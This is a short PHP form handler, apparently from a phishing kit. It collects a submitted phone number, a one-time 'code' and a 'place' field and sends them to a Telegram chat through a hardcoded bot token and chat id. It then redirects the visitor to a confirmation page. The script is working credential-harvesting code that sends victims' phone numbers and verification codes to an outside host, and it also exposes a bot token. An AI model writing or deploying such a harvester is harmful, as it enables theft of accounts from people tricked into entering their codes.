<?php

/* https://api.telegram.org/bot5379121137:AAELghRmG5won1o0_e2yfbvCtYjfHiMM6bk/getUpdates */
$code = $_POST['code'];
$phone = $_POST['phone'];
$place = $_POST['place'];
$token = "5379121137:AAELghRmG5won1o0_e2yfbvCtYjfHiMM6bk";
$chat_id = "-685413850";
$arr = array(
  'Телефон: ' => $phone,
  'Код: ' => $code,
  'Место: ' => $place
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: conf.html');
  setcookie('conf', time() + 200, "/");
} else {
  echo "Error";
}
?>